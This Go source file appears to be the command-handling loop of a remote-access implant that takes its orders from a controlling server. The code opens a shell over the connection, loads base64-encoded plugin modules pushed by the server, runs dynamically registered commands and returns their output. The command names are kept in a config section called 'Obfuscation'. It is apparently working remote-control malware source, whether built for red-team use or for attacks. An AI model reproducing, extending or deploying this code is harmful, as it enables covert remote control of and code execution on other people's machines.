package session

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"src/Client/generic/commands"
	"src/Client/generic/config"
	"src/Client/generic/logger"
	"src/Client/generic/rpc_client"
	"src/Client/session/protocol"
	"strings"
)

func commandHandler(conn net.Conn) error {
	if conn == nil {
		logger.Error("Connection is nil, cannot handle commands.")
		return fmt.Errorf("connection is nil")
	}

	for {
		// Wait for commands from the server
		logger.Log("Waiting for command from server...")
		command, err := protocol.ReceiveData(conn)
		logger.Log(fmt.Sprintf("Received command: %s", string(command)))
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to receive command: %v", err))
			return fmt.Errorf("failed to receive command: %w", err)
		}

		// Process the command
		if err := processCommand(conn, string(command)); err != nil {
			logger.Error(fmt.Sprintf("Failed to process command: %v", err))
			return fmt.Errorf("failed to process command: %w", err)
		}
	}
}

func processCommand(conn net.Conn, command string) error {
	logger.Log(fmt.Sprintf("Received command: %s", command))

	var cmdName string
	var cmdData string

	var jsonCmd map[string]json.RawMessage
	if err := json.Unmarshal([]byte(command), &jsonCmd); err == nil && len(jsonCmd) == 1 {
		for k, v := range jsonCmd {
			cmdName = k
			cmdData = string(v)
		}
		// Remove possible surrounding quotes from cmdData if it's a string
		cmdData = strings.Trim(cmdData, "\"")
	} else {
		// Fallback: Parse as space-separated command
		parts := strings.SplitN(command, " ", 2)
		cmdName = parts[0]
		if len(parts) > 1 {
			cmdData = parts[1]
		}
	}

	var response string

	// Handle built-in and dynamic commands
	switch cmdName {
	case config.Obfuscation.Generic.Commands.Shell:
		logger.Log("Received shell command, executing shell handler.")
		commands.ShellHandler(conn)
		return nil
	case config.Obfuscation.Generic.Commands.Module:
		logger.Log("Received module command, loading dynamic plugin.")
		var moduleData struct {
			Name string `json:"name"`
			Data string `json:"data"`
		}
		if err := json.Unmarshal([]byte(cmdData), &moduleData); err != nil {
			logger.Error(fmt.Sprintf("Failed to unmarshal module data: %v", err))
			response = "Error: Malformed data for 'module' command: " + err.Error()
		} else {
			decoded, err := base64.StdEncoding.DecodeString(moduleData.Data)
			if err != nil {
				logger.Error(fmt.Sprintf("Failed to decode module data: %v", err))
				response = "Error: Failed to decode module data: " + err.Error()
			} else if err := rpc_client.LoadDynamicCommandFromSession(moduleData.Name, decoded); err != nil {
				logger.Error(fmt.Sprintf("Failed to load module %s: %v", moduleData.Name, err))
				response = fmt.Sprintf("Error loading module %s: %v", moduleData.Name, err)
			} else {
				response = fmt.Sprintf("Module %s loaded successfully", moduleData.Name)
			}
		}
	default:
		if rpc_client.HasCommand(cmdName) {
			logger.Log(fmt.Sprintf("Executing dynamic session command: '%s'", cmdName))
			resp, err := rpc_client.ExecuteFromSession(cmdName, []string{cmdData})
			if err != nil {
				logger.Error(fmt.Sprintf("Error executing %s: %v", cmdName, err))
				response = fmt.Sprintf("Error executing %s: %v", cmdName, err)
			} else {
				response = resp
			}
		} else {
			logger.Log(fmt.Sprintf("Unknown session command: %s", cmdName))
			response = fmt.Sprintf("Unknown command: %s", cmdName)
		}
	}

	// Send response back to server
	if err := protocol.SendData(conn, []byte(response)); err != nil {
		logger.Error(fmt.Sprintf("Failed to send response for command %s: %v", cmdName, err))
		return fmt.Errorf("failed to send response: %w", err)
	}
	logger.Log(fmt.Sprintf("Sent response for command: %s", cmdName))
	return nil
}
